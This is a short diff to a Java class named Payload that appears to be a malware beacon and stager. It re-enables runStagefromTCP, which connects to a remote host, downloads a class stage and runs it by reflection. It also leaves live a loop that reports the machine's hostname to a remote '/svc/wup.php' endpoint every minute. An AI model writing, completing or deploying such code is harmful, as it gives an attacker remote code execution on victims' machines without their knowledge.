@@ -104,7 +104,7 @@ public class Payload {
                             if (exec.equals("1")) {
 
                                 result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&exec=0");
- //                               runStagefromTCP(url);
+                                runStagefromTCP(url);
                             }
 
                             Thread.sleep(60 * 1000);
@@ -172,7 +172,7 @@ public class Payload {
         }
         readAndRunStage(new DataInputStream(inStream), new ByteArrayOutputStream(), parameters);
     }
-
+*/
     private static void runStagefromTCP(String url) throws Exception {
         Socket sock;
         String[] parts = url.split(":");
@@ -215,5 +215,5 @@ public class Payload {
         myClass.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, parameters});
         //System.exit(0);
     }
-*/
+
 }
